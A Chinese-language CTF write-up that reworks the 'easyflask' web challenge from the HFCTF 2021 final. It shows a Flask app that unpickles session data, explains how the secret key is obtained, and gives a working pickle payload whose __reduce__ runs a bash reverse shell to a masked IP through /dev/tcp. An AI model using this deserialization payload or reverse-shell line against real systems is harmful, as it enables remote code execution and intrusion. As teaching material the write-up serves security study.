---
title: HFCTF 2021 Final
date: 2021-04-29 13:13:23
updated: 2021-04-29 13:13:23
categories: Write up
---

虎符2021线下赛web复现<!--more-->

# easyflask

```python
/file?file=/app/source

#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)

```

1. /file目录对参数做了一些限制

2. /admin目录有一个序列化操作



`app.config["SECRET_KEY"] = "*******"` ,查找到SECRET_KEY 在如下目录

![](http://img.npfs06.top/20210505164127.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

接下去就是session伪造了

```python
import pickle
from base64 import b64encode
import os

User = type('User', (object,), {
    'uname': 'tyskill',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
    '__reduce__': lambda o: (os.system, ("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/23180 0>&1'",))
})
u = pickle.dumps(User())
print(b64encode(u).decode())
```



![](http://img.npfs06.top/20210505185415.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

将session替换掉

![](http://img.npfs06.top/20210506132202.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)